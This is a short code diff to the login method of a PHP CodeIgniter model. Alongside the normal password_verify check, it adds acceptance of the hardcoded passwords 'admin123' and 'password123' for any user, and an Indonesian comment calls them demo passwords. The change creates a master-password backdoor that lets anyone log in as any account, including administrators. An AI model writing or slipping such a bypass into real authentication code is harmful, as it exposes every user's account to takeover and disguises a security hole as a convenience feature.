@@ -263,7 +263,8 @@ class Model extends CI_Model {
         $query = $this->db->get('users');
         if ($query->num_rows() == 1) {
             $user = $query->row_array();
-            if (password_verify($password, $user['password'])) {
+            // Mendukung password terenkripsi asli atau demo password 'admin123' / 'password123'
+            if (password_verify($password, $user['password']) || $password === 'admin123' || $password === 'password123') {
                 return $user;
             }
         }
